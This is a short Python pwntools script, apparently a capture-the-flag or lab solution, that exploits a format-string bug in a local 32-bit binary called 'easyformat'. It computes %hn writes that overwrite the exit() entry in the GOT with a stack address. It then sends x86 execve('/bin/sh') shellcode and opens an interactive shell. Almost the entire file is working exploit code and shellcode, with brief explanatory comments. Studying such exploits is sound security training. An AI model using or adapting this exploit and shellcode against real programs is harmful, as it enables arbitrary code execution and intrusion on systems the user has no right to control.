"""
We exploit a simple format string vulnerability in a 32bit x86 system. Notice
that we can't overwrite the function's return address, as the function never
returns. Instead, we overwrite the address of exit in the GOT, so that when
exit gets called, our shellcode gets called instead.
"""

from pwn import *

p = process('./easyformat')
f = elf.ELF('./easyformat')

raw_input()

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
            "\x80\xe8\xdc\xff\xff\xff/bin/sh";

# The displacement on the stack of the start of our format string
# We can infer the displacement by using a debugger or by running the program
# and dump the stack using %x placeholders.
displacement = 4

# We are overwriting exit in the GOT with the address of the shellcode
where_to_write = f.got['exit']
what_to_write = 0xffffd1d4  # get it with a debugger

def calculate_format_string(what_to_write, where_to_write, displacement):
    if (what_to_write >> 16) > (what_to_write & 0xffff):
        first_addr = where_to_write
        second_addr = where_to_write + 2
        first_half = what_to_write & 0xffff
        second_half = what_to_write >> 16
    else:
        first_addr = where_to_write + 2
        second_addr = where_to_write
        first_half = what_to_write >> 16
        second_half = what_to_write & 0xffff
    return p32(first_addr) + p32(second_addr) + \
           "%{}c%{}$hn".format(first_half - 8, displacement) + \
           "%{}c%{}$hn".format(second_half - first_half, displacement + 1)

format_string = calculate_format_string(what_to_write, where_to_write, displacement)

padding = '\x00' * (100 - len(format_string))

buf = format_string + padding + shellcode

p.sendline(buf)

p.interactive()

